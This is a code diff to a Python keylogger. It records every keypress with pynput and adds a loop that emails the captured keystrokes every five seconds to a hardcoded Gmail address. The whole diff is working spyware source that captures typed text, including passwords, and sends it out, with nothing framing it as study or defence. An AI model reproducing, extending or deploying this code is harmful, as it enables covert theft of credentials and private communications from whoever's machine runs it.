@@ -1,6 +1,10 @@
-def log_keys(interval_in_mins):
+sentence = ""
+USERNAME = ""
+PASSWORD = ""
+
+def start_logging_keys():
+    global sentence
     import pynput.keyboard
-    import send
     from pynput.keyboard import Key
 
     sentence = ""
@@ -33,15 +37,52 @@ def log_keys(interval_in_mins):
             sentence += "[DOWN]"
         elif key == Key.backspace:
             sentence += "[BACKSPACE]"
+        elif key == Key.esc:
+            sentence += "[ESC]"
         else:
             sentence += str(key.char)
 
-    keyboard_listener = pynput.keyboard.Listener(on_press=key_press)
+    def on_release(key):
+        if key == Key.esc:
+            # Stop listener
+            return False
 
-    counter = 0
+    keyboard_listener = pynput.keyboard.Listener(on_press=key_press, on_release=on_release)
+    keyboard_listener.start()
 
-    with keyboard_listener:
-        try:
-            keyboard_listener.join()
-        except:
-            print(sentence)
+    return keyboard_listener
+
+def start_periodic_send_email(interval):
+    global sentence, USERNAME, PASSWORD
+    import threading
+    from send import send_mail
+
+    ticker = threading.Event()
+    try:
+        while not ticker.wait(interval):
+            if len(sentence) > 0:
+                send_mail(USERNAME, PASSWORD, 'tejashah88@gmail.com', sentence)
+                sentence = ""
+    except KeyboardInterrupt:
+        print('gitcga')
+        ticker.set()
+
+if __name__ == "__main__":
+    print('starting to log keys...')
+    keyboard_listener = start_logging_keys()
+
+    print('starting email broadcaster...')
+    start_periodic_send_email(5)
+
+    # gracefully shutdown
+    import signal
+    import sys
+
+    def signal_handler(sig, frame):
+        print('You pressed Ctrl+C!')
+        keyboard_listener.stop()
+        sys.exit(0)
+
+    signal.signal(signal.SIGINT, signal_handler)
+    print('Press Ctrl+C')
+    signal.pause()
